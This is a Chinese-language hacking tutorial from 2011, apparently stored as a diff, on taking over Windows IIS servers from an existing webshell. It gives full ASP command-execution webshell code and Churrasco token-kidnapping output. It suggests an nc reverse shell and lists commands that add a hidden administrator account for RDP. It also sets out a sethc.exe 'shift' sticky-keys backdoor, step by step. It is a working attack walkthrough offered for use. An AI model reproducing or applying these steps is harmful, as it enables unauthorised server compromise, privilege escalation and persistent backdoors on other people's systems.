@@ -1,0 +1,106 @@
+利用SHIft后门拿服务器方法2011-01-19 23:18说起WebShell提权的方法网上文章是非常多!
+
+　　那么在这里我写点自己提权时所用到几个小方法!也是自己实战得来的经验!
+
+　　方法如有不对的请大家多多指点!
+
+　　提权时要到的工具如下：cmd.exe Churrasco.exe nc.exe
+
+　　以上就是今天主要讲的!东西是死的!人是活的!就看你怎么用了!
+
+　　用以上工具先要确定SHELL里 wscript.shell 命令行执行组件是否可用!如不能用用以下方法进行调用!如调用也不行!那么就请你另想办法!
+
+　　代码如下 ：
+
+<object runat=server id=oScriptlhn scope=page classid="clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8"></object> 
+<%if err then%> 
+<object runat=server id=oScriptlhn scope=page classid="clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"></object> 
+<% 
+end if %> 
+<form method="post"> 
+<input type=text name="cmdx" size=60 value="C:\RECYCLER\cmd.exe"><br> 
+<input type=text name="cmd" size=60><br> 
+<input type=submit value="net user"></form> 
+<textarea readonly cols=80 rows=20> 
+<%On Error Resume Next 
+if request("cmdx")="C:\RECYCLER\cmd.exe" then 
+response.write oScriptlhn.exec("cmd.exe /c"&request("cmd")).stdout.readall 
+end if 
+response.write oScriptlhn.exec(request("cmdx")&" /c"&request("cmd")).stdout.readall 
+%> 
+</textarea> 
+
+
+　　将以上代码保存为cmd.asp上传到SHELL里 再访问这个CMD.asp如没有出错等就说明可以执行CMD命令!
+
+　　下面先来将Churrasco.exe怎么用才能更好的发挥它的作用!有很多朋友问我为什么我上传的Churrasco.exe执行命令时没有出现命令成功 原因有几种这里我就不多说了!那么这时我们要想到Churrasco.exe行命令时没有出现命令成功 但出现/churrasco/-->Current User: NETWORK SERVICE
+
+　　/churrasco/-->Getting Rpcss PID ...
+
+　　/churrasco/-->Found Rpcss PID: 696
+
+　　/churrasco/-->Searching for Rpcss threads ...
+
+　　/churrasco/-->Found Thread: 444
+
+　　/churrasco/-->Thread not impersonating, looking for another thread...
+
+　　/churrasco/-->Found Thread: 700
+
+　　/churrasco/-->Thread not impersonating, looking for another thread...
+
+　　/churrasco/-->Found Thread: 704
+
+　　/churrasco/-->Thread not impersonating, looking for another thread...
+
+　　/churrasco/-->Found Thread: 712
+
+　　/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0xf24
+
+　　/churrasco/-->Getting SYSTEM token from Rpcss Service...
+
+　　/churrasco/-->Found szywjs Token
+
+　　/churrasco/-->Found SYSTEM token 0xf1c
+
+　　/churrasco/-->Running command with SYSTEM Token...
+
+　　直到这里 没有出现命令执行成功 那么这时你千万不要放弃!离成功加差一步!这里你就用NC进行反弹一个CMDSHELL看下如果反弹回来的CMDSHELL权限很大的话那我就不用说了!如果说权限很小的这里你也有很大的希望了!
+
+　　在反弹回来的CMDSHELL里执行 C:\RECYCLER\Churrasco.exe "net user iisuser iisuser /add”
+
+　　C:\RECYCLER\Churrasco.exe "net localgroup administrators iisuser /add"
+
+　　C:\RECYCLER\Churrasco.exe 这里是你所传到的目录!这样可以说90%的出现命令执行成功!这样就可以进行3389连接了!
+
+　　如果说这时没有出现命令执行成功 下面我就再告诉你一种方法!
+
+　　如下 依次执行：
+
+　　attrib c:\windows\system32\sethc.exe -h -r -s
+
+　　attrib c:\windows\system32\dllcache\sethc.exe -h -r -s
+
+　　del c:\windows\system32\sethc.exe
+
+　　copy c:\windows\explorer.exe c:\windows\system32\sethc.exe
+
+　　copy c:\windows\system32\sethc.exe c:\windows\system32\dllcache\sethc.exe
+
+　　attrib c:\windows\system32\sethc.exe +h +r +s
+
+　　attrib c:\windows\system32\dllcache\sethc.exe +h +r +s
+
+　　如果出现拒绝等错误 那就没法了!如果说这台服务器先是被别人拿过了做了shift后门 那么就是100%成功!本人亲自用这方法成功替换过别人带有密码的SHIFT后门!
+
+　　还有一点就是在webSHELL里或CMDSHELL下也可以这样执行!
+
+　　C:\RECYCLER\Churrasco.exe "copy d:\windows\explorer.exe d:\windows\system32\sethc.exe"
+
+　　C:\RECYCLER\Churrasco.exe "copy d:\windows\system32\sethc.exe d:\windows\system32\dllcache\sethc.exe "
+
+　　还有就是attrib 加属性等也可以这样执行!还有一点忘了就是在反弹回来的CMDSHELL里用这种方法也可以!
+
+　　这样就可以利用SHIft后门成功拿下服务器了。
+ 
+
